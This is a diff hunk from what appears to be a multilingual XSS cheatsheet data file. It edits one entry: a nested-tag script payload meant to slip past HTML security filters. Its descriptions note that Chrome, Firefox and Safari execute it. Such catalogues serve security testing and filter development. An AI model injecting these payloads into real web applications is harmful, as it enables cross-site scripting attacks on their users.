@@ -2041,7 +2041,7 @@ var items =
             'cs' : 'Tagy vložené do jiných tagů pro oklamání bezpečnostních filtrů',
             'de' : ''
         },
-        'data'       : '<b <script>%js_alert%</script>0',
+        'data'       : '<b <script>%js_alert%//</script>0</script>',
         'description': {
             'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
             'ja' : '',
